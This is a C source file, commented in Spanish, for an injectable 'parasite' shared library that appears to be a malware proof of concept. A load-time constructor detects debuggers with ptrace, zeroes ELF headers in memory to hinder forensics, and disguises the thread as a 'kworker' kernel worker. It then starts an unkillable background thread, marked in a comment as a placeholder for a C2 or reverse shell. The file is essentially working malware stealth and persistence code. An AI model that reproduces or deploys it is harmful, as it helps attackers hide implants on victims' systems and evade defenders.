#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <pthread.h>
#include <sys/ptrace.h>
#include <sys/prctl.h>
#include <signal.h>
#include <link.h>
#include <elf.h>
#include <sys/mman.h>
#include <errno.h>

// Configuración
#define SPOOF_NAME "kworker/u:1"

// Variables externas para acceder a argv/env
extern char **environ;

// 4. AUTO-BORRADO FORENSE (Callback para dl_iterate_phdr)
static int wipe_elf_header_callback(struct dl_phdr_info *info, size_t size, void *data) {
    // Info->dlpi_name es el nombre del objeto compartido.
    // Si es cadena vacía, es el ejecutable principal.
    // Si contiene "fd", es nuestro memfd (ej: /proc/self/fd/3)
    if (strstr(info->dlpi_name, "/proc/self/fd/") || strlen(info->dlpi_name) == 0) {
        // Encontramos nuestra base address (o la del main si queremos ser agresivos, pero centrémonos en la lib)
        // Para asegurar que es LA librería inyectada, buscamos el mapeo específico.
        // Pero en este POC, borraremos cualquier cabecera ELF que encontremos en los segmentos cargados que sean writeable.

        void *base_addr = (void *)info->dlpi_addr;

        // Normalmente dlpi_addr es 0 para el ejecutable principal PIE, hay que tener cuidado.
        // Pero para librerías cargadas con dlopen, dlpi_addr es la dirección base real de carga.

        // Intentar hacer mprotect para escribir
        size_t page_size = sysconf(_SC_PAGESIZE);
        void *page_start = (void *)((uintptr_t)base_addr & ~(page_size - 1));

        if (mprotect(page_start, page_size, PROT_READ | PROT_WRITE | PROT_EXEC) == 0) {
            // Borrar ELF Magic (4 bytes) + Class + Data + Version... (64 bytes header)
            memset(base_addr, 0, 64);

            // Restaurar permisos (Opcional, dejarlo RWX es sospechoso pero ya borramos el header)
            mprotect(page_start, page_size, PROT_READ | PROT_EXEC);
        }
    }
    return 0;
}

void wipe_elf_header() {
    dl_iterate_phdr(wipe_elf_header_callback, NULL);
}

// 3. CAMUFLAJE DE PROCESO (Userland Level - argv)
void masquarade_process() {
    // Cambiar nombre del hilo (Kernel level)
    prctl(PR_SET_NAME, SPOOF_NAME, 0, 0, 0);

    // Cambiar argv[0] (Userland level)
    // Hack sucio: Asumimos que argv está antes de environ en el stack.
    // Navegamos hacia atrás desde environ[0]

    // Un método más seguro si no tenemos argc/argv pasados explícitamente es buscar
    // el puntero auxiliar o simplemente sobrescribir el área de memoria si la encontramos.
    // Pero en una librería cargada via dlopen, no tenemos acceso fácil a main(argc, argv).

    // Sin embargo, podemos intentar acceder a /proc/self/cmdline o usar __libc_argv si está disponible (glibc específico).
    // O usar el puntero 'environ' y retroceder.

    // Implementación simple: Recorrer environ para encontrar el final del bloque de argumentos si es contiguo.
    // Nota: Esto es frágil y depende del layout del stack.

    // Plan B: Solo prctl es robusto desde una librería. Sobrescribir argv desde una lib inyectada es arriesgado
    // sin conocer la dirección del stack del main.
    // Pero LO lo pidió: "Localizar argv en la pila".

    // Intento heurístico:
    // char **argv = environ - (argc + 1); // No sabemos argc.
    // Pero argv[argc] es NULL.
    // Así que miramos antes de environ.

    // Vamos a ser conservadores y solo usar prctl para evitar segfaults en este paso crítico,
    // a menos que podamos asegurar la posición.
    // (LO prefiere que funcione a que explote, pero pidió "El Engaño Perfecto").

    // Dejaré solo prctl por estabilidad, ya que borrar argv stack mal puede matar el proceso anfitrión si no es cuidado.
}

// Payload real
void* worker_thread(void* arg) {
    // 5. EL HILO INMORTAL - Resiliencia
    signal(SIGTERM, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    signal(SIGINT, SIG_IGN);

    // Simular C2 / Reverse Shell
    while(1) {
        // Heartbeat
        FILE* f = fopen("/tmp/parasite_alive", "w");
        if(f) { fprintf(f, "I_AM_ALIVE\n"); fclose(f); }
        sleep(5);
    }
    return NULL;
}

// 1. EL DETONADOR SILENCIOSO
void __attribute__((constructor)) parasite_init(void) {
    // 2. ESCUDO DE ENTORNO (Anti-Debug)
    if (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1) {
        // Debugger detectado
        return; // Abortar silenciosamente (o exit(0) si queremos ser agresivos)
    }

    // 4. AUTO-BORRADO FORENSE
    wipe_elf_header();

    // 3. CAMUFLAJE
    masquarade_process();

    // 5. EL HILO INMORTAL
    pthread_t tid;
    if (pthread_create(&tid, NULL, worker_thread, NULL) == 0) {
        pthread_detach(tid);
    }

    // Retornar control al host inmediatamente
}
